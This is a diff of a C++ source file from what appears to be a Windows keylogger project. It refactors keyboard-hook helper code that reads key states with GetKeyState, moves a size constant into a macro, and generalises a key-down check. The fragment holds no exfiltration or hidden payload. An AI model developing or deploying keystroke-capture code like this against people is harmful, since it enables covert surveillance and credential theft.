@@ -1,6 +1,6 @@
 #include "keyboard.h"
 #include "keylogger.h"
-#include "configuration.h"
+#include "constants.h"
 #include <stdexcept>
 
 HHOOK hook;
@@ -24,7 +24,7 @@ void keyboard::set_hook()
 
 void keyboard::get_state(BYTE* keyboard_state) noexcept
 {
-    for (uint16_t i = 0; i < configuration::keyboard_state_size; i++)
+    for (uint16_t i = 0; i < KEYBOARD_STATE_SIZE; i++)
     {
         const auto key_state = GetKeyState(i);
 
@@ -32,12 +32,7 @@ void keyboard::get_state(BYTE* keyboard_state) noexcept
     }
 }
 
-bool keyboard::is_control_down() noexcept
+bool keyboard::is_down(DWORD vk_code) noexcept
 {
-    return is_down(GetKeyState(VK_CONTROL)) || is_down(GetKeyState(VK_RCONTROL)) || is_down(GetKeyState(VK_LCONTROL));
-}
-
-constexpr bool keyboard::is_down(SHORT key_status) noexcept
-{
-    return key_status >> 15;
+    return GetKeyState(vk_code) >> 15;
 }
